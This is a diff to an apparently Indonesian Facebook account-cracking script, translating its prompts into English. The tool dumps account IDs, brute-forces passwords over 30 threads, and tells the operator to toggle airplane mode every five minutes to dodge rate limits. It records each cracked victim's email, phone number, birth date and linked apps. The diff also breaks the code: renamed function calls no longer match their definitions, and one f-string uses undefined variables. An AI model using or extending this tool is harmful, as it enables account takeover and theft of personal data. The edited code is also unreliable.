@@ -135,9 +135,9 @@ def menu(my_name,my_id,my_birthday):
 	cetak(nel(oi, title='MENU'))
 	jh = input(x+'['+p+'<>'+x+'] Pilih : ')
 	if jh in ['1','01']:
-		dump_publik()
+		dump_public()
 	elif jh in ['2','02']:
-		dump_massal()
+		dump_bulk()
 	elif jh in ['3','03']:
 		result()
 	elif jh in ['4','04']:
@@ -158,7 +158,7 @@ def menu(my_name,my_id,my_birthday):
 def result():
 	cek = '# CHECK RESULT CRACK'
 	sol().print(mark(cek, style='green'))
-	kayes = '[01] Cek Hasil Cp\n[02] Cek Hasil Ok\n[00] Kembali Ke Menu'
+	kayes = '[01] Check Results Cp\n[02] Check Results Ok\n[00] Kembali Ke Menu'
 	kis = nel(kayes, style='cyan')
 	cetak(nel(kis, title='RESULTS'))
 	kz = input(x+'['+p+'f'+x+'] Pilih : ')
@@ -246,16 +246,16 @@ def result():
 			geeh = input(x+'['+p+'f'+x+'] Pilih : ')
 			try:geh = lol[geeh]
 			except KeyError:
-				ric = '# PILIHAN TIDAK ADA DI MENU'
+				ric = '# THERE IS NO CHOICE IN MENU'
 				sol().print(mark(ric, style='red'))
 				exit()
 			try:lin = open('OK/'+geh,'r').read()
 			except:
-				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
+				hehe = '# NO FILE FOUND, CHECK & TRY AGAIN'
 				sol().print(mark(hehe, style='red'))
 				time.sleep(2)
 				back()
-			akun = '# LIST AKUN OK ANDA'
+			akun = '# LIST ACCOUNT OK YOU'
 			sol().print(mark(akun, style='green'))
 			hus = os.system('cd OK && cat '+geh)
 			akun2 = '# LIST AKUN OK ANDA'
@@ -265,13 +265,13 @@ def result():
 	elif kz in ['0','00']:
 		back()
 	else:
-		ric = '# PILIHAN TIDAK ADA DI MENU'
+		ric = '# CHOICE NOT FOUND IN MENU'
 		sol().print(mark(ric, style='red'))
 		exit()
 
 # OPEN
 def file():
-	tek = '# CEK OPSI DARI FILE'
+	tek = '# CHECK OPTION FROM FILE'
 	sol().print(mark(tek, style='cyan'), style='on red')
 	print(x+'['+h+'•'+x+'] Sedang Membaca File, Tunggu Sebentar ...')
 	time.sleep(2)
@@ -340,7 +340,7 @@ def dump_publik():
 		token = open('.token.txt','r').read()
 	except IOError:
 		exit()
-	win = '# DUMP ID PUBLIK'
+	win = '# DUMP ID PUBLIC'
 	win2 = mark(win, style='green')
 	sol().print(win2)
 	print(x+'['+h+'•'+x+'] Type "me" If you Want to Dump ID From Friend')
@@ -365,7 +365,7 @@ def dump_publik():
 
 # DUMP ID BULK
 def dump_massal():
-	win = '# DUMP ID PUBLIK MASSAL'
+	win = '# DUMP ID PUBLIK BULK'
 	win2 = mark(win, style='green')
 	sol().print(win2)
 	print(x+'['+h+'•'+x+'] MASUKKAN JUMLAH ID (LIMIT 10)')
@@ -434,7 +434,7 @@ def setting():
 		ric = '# PILIHAN TIDAK ADA DI MENU'
 		sol().print(mark(ric, style='red'))
 		exit()
-	met = '# PILIH METHOD CRACK'
+	met = '# SELECT METHOD CRACK'
 	sol().print(mark(met, style='green'))
 	ioz = '[01] Method B-Api (Fast)\n[02] Method Mobile (Slow)\n[03] Methode Free Facebook'
 	gess = nel(ioz, style='cyan')
@@ -446,7 +446,7 @@ def setting():
 		method.append('free')
 	else:
 		method.append('mobile')
-	guw = '# PILIHAN OPSI CRACK '
+	guw = '# SELECT CRACK OPTION '
 	sol().print(mark(guw, style='green'))
 	aplik = input(x+'['+p+'f'+x+'] Show Application Linked ? (y/t) : ')
 	if aplik in ['y','Y']:
@@ -464,7 +464,7 @@ def setting():
 def passwrd():
 	ler = '# CRACK PROCESS STARTED, PRESS CTRL+Z FOR STOP'
 	sol().print(mark(ler, style='green'))
-	krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s\nHidupkan/Matikan Mode Pesawat Setiap 5 Menit'%(okc,cpc)
+	krek = 'REsults Live  Saved To : OK/%s\nResults Check Saved To : CP/%s\nTurn On/Turn Off Airplane Mode Every 5 Minute'%(okc,cpc)
 	cetak(nel(krek, title='CRACK'))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
@@ -497,7 +497,7 @@ def passwrd():
 	print('')
 	tanya = '# INGIN MENGECEK OPSI HASIL CRACK?'
 	sol().print(mark(tanya, style='green'))
-	woi = input(x+'['+p+'f'+x+'] Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')
+	woi = input(x+'['+p+'f'+x+'] Want to Show Results Crack Option? (y/t) : ')
 	if woi in ['y','Y']:
 		cek_opsi()
 	else:
@@ -577,7 +577,7 @@ def crack(idf,pwv):
 							tahun += nenen+", "
 					except:pass
 
-					infoakun += (f"[✓] Nama Akun       : {nama}\n[✓] Jumlah Teman    : {teman}\n[✓] Jumlah Pengikut : {pengikut}\n[✓] Email Aktif     : {email}\n[✓] Nomor Aktif     : {nomer}\n[✓] Tahun Akun      : {tahun}\n[✓] Tanggal Lahir   : {ttl}\n")
+					infoakun += (f"[✓] Name Account       : {name}\n[✓] Amount Friend    : {friend}\n[✓] Amount Follower : {follower}\n[✓] Email Active     : {email}\n[✓] Number Active     : {number}\n[✓] Year Account      : {year}\n[✓] Date Of Birth   : {ttl}\n")
 
 					hit1, hit2 = 0,0
 					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
@@ -746,7 +746,7 @@ def crack3(idf,pwv):
 							tahun += nenen+", "
 					except:pass
 
-					infoakun += (f"[✓] Nama Account       : {nama}\n[✓] Amount Friend    : {friend}\n[✓] Amount Follower : {follower}\n[✓] Email Active     : {email}\n[✓] Number Active     : {number}\n[✓] Year Active      : {year}\n[✓] Date Born   : {ttl}\n")
+					infoakun += (f"[✓] Name Account       : {nama}\n[✓] Amount Friend    : {friend}\n[✓] Amount Follower : {follower}\n[✓] Email Active     : {email}\n[✓] Number Active     : {number}\n[✓] Year Active      : {year}\n[✓] Date Of Birth   : {ttl}\n")
 
 					hit1, hit2 = 0,0
 					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki).text
